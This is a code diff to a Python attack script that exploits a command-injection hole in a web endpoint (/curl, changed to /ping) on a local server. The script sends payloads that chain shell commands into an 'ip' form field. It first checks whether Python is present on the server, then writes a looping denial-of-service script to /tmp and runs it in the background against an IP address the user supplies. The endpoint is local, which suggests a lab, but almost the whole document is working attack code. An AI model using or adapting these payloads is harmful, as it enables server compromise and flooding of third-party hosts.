@@ -1,13 +1,13 @@
 import requests
 
 # Target URL for the vulnerable endpoint
-url = "http://127.0.0.1:5000/curl"
+url = "http://127.0.0.1:5000/ping"
 
 # Ask user for the IP address to target for the DoS attack
 target_ip = input("Enter the target IP address for the DoS attack: ")
 
 # Step 1: Check if Python is installed on the target
-check_python_payload = f"{target_ip} && python --version && echo 'Python is installed' || echo 'Python not found'"
+check_python_payload = "127.0.0.1 && python --version && echo 'Python is installed' || echo 'Python not found'"
 data = {
     "ip": check_python_payload
 }
@@ -29,25 +29,19 @@ target_ip = '{target_ip}'
 
 # Simple DoS attack by sending continuous ping requests
 while True:
-    print('sending..........')
-    os.system(f'curl {{target_ip}}')
+    os.system(f'ping -c 1 {{target_ip}}')
     time.sleep(0.1)
 """
 
         # Construct the malicious payload to create the Python script
-        python_payload = f"{target_ip} && echo \"{python_dos_code}\" > dos_attack.py; python dos_attack.py "
+        python_payload = f"127.0.0.1&& echo \"{python_dos_code}\" > /tmp/dos_attack.py; python3 /tmp/dos_attack.py &"
 
         # Send the Python-based attack payload to the server
         data = {
             "ip": python_payload
         }
         
-
-        for x in range(10):
-            response = requests.post(url, data=data)
-        
-        
-        
+        response = requests.post(url, data=data)
         print(f"Response from server after sending Python DoS attack: {response.text}")
     
     else:
